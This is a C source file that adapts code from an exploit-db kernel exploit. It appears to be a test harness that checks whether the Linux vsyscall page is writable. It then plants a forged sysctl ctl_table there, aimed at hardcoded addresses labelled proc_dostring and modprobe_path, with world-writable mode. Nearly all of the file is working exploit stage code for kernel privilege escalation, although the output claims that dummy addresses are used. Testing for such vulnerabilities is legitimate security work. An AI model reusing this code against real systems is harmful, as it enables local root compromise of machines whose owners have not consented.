/*
 Copyright [2015-2017] Hewlett Packard Enterprise Development LP

This program is free software; you can redistribute it and/or modify it under the terms 
of version 2 of the GNU General Public License as published by the Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program; 
if not, write to:
  Free Software Foundation, Inc.
  51 Franklin Street, Fifth Floor
  Boston, MA 02110-1301, USA.
*/
/*
 * This program incorporates some code by "rebel" from:
 *  https://www.exploit-db.com/exploits/40871/
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>


#define VSYSCALL 0xffffffffff600000


struct ctl_table {
    const char *procname;
    void *data;
    int maxlen;
    unsigned short mode;
    struct ctl_table *child;
    void *proc_handler;
    void *poll;
    void *extra1;
    void *extra2;
};

int verification_result = 0;

void catch_sigsegv(int sig)
{
    verification_result = 0;
    pthread_exit((void *)1);
}


void *modify_vsyscall(void *arg)
{
    unsigned long *vsyscall = (unsigned long *)(VSYSCALL+0x850);
    unsigned long x = (unsigned long)arg;

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGSEGV);

    if(pthread_sigmask(SIG_UNBLOCK, &set, NULL) != 0) {
        fprintf(stderr,"couldn't set sigmask\n");
        exit(1);
    }

    signal(SIGSEGV, catch_sigsegv);

    *vsyscall = 0xdeadbeef+x;

    if(*vsyscall == 0xdeadbeef+x) {
        fprintf(stderr,"\nvsyscall page altered!\n");
        verification_result = 1;
        pthread_exit(0);
    }

    return NULL;
}

void verify_stage1(void)
{
    int x;
    pthread_t v_thread;

    sleep(5);

    for(x=0; x<300; x++) {

        pthread_create(&v_thread, NULL, modify_vsyscall, 0);

        pthread_join(v_thread, NULL);

        if(verification_result == 1) {
            return;
        }

        write(2,".",1);
        sleep(1);
    }

    printf("could not modify vsyscall\n");

    exit(1);
}


int main(int argc, char **argv)
{
    struct ctl_table *c;

    printf("Checking vsyscall page writable..\n\n");

    verify_stage1();

    printf("Vsyscall kernel page writable\n");

    printf("Planting new ctl_table in vsys region..\n\n");
    printf("Note dummy values being used for modprobe_path and proc_dostring\n");

    c = (struct ctl_table *)(VSYSCALL+0x850);
    memset((char *)(VSYSCALL+0x850), '\x00', 1952);

    strcpy((char *)(VSYSCALL+0xf00),"hack");
    memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4);
    c->procname = (char *)(VSYSCALL+0xf00);
    c->mode = 0666;
    c->proc_handler = (void *)0xffffffffaa083310; //(proc_dostring());
    c->data = (void *)0xffffffffaae553c0; //(modprobe_path());
    c->maxlen=256;
    c->extra1 = (void *)(VSYSCALL+0xe00);
    c->extra2 = (void *)(VSYSCALL+0xd00);

    printf("New ctl_table in place on vsys memory page\n");
    return 0;
}
